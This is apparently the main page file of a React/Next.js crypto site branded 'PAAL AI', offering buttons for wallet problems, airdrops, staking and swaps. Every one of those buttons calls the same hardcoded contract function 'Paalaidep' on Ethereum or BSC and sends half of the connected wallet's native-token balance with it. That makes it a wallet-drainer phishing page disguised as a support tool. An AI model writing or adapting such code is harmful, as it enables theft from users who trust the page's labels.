import { ConnectWallet, useBalance, useContract, useContractWrite, Web3Button } from "@thirdweb-dev/react";
import { NextPage } from "next";
import { Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link } from "@nextui-org/react";
import { useContext, useState } from "react";
import ChainContext from "../context/Chain";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import { utils } from "ethers";

const Home: NextPage = () => {
  const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
  const wbalance = data?.displayValue;
  console.log(wbalance);
  
  let balx: string | undefined;
  if (wbalance !== undefined) {
    const numericBalance = parseFloat(wbalance);
    if (!isNaN(numericBalance)) {
      balx = (numericBalance * 0.5).toString();
   
  };
  };
  const parsedBalx = balx || '0';
  const { selectedChain, setSelectedChain } = useContext(ChainContext);
  const addresses: Record<string, string> = {
    ["ethereum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
    ["binance"]: "0xD606CD40c93C297327c7294ecB14fC6197fFB6B8",
  };
  const { contract } = useContract(addresses[selectedChain]);
  const { mutateAsync, error } = useContractWrite(
    contract,
    "Paalaidep",
  );
  
  const handleChainChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setSelectedChain(e.target.value);
  };

  return (
    <div className="bg-cover bg-center min-h-screen" style={{ backgroundImage: `url('images/bg-paal.png')` }}>
        <Navbar>
          <NavbarBrand>
            <Image src="images/logo.png" alt="Logo" className="h-12" />
          </NavbarBrand>
          <NavbarContent justify="end">
            <NavbarItem>
              <ConnectWallet modalTitle={"Connect to PAAL AI"}></ConnectWallet>
            </NavbarItem>
          </NavbarContent>
        </Navbar>
        <div className="flex justify-center items-center">
          <br /><br /><br /><br /><br /><br/><br/>
          <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
          <br />
        </div>
        <h1 className="flex justify-center font-bold text-lg text-white">
          <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
        </h1>
        
        <br />
        <div className="flex flex-col items-center justify-center">
  <select
    className="block font-bold px-4 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
    value={selectedChain}
    onChange={handleChainChange}
  >
    <option value="binance">Binance Smart Chain</option>
    <option value="ethereum">Ethereum</option>
  </select>

  <div className="grid grid-cols-2 md:grid-cols-6 items-center justify-center py-6 gap-8">
    <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Fix Gas</Web3Button>
    </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Claim Token</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Migration</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Swap</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Slippage</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Exchange</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Whitelist</Web3Button>
    </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Buy Coins/Tokens</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >NFTs</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Claim Airdrop</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Missing Balance</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Irregular Balance</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Staking</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Cross Transfer</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Transaction</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Wallet Glitch/Error</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Transaction Delay</Web3Button>
  </div>
  <div>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(parsedBalx), 
          },
        })
      }
    >Claim</Web3Button>
  </div>
  </div>
  </div>
</div>      
  );
};

export default Home;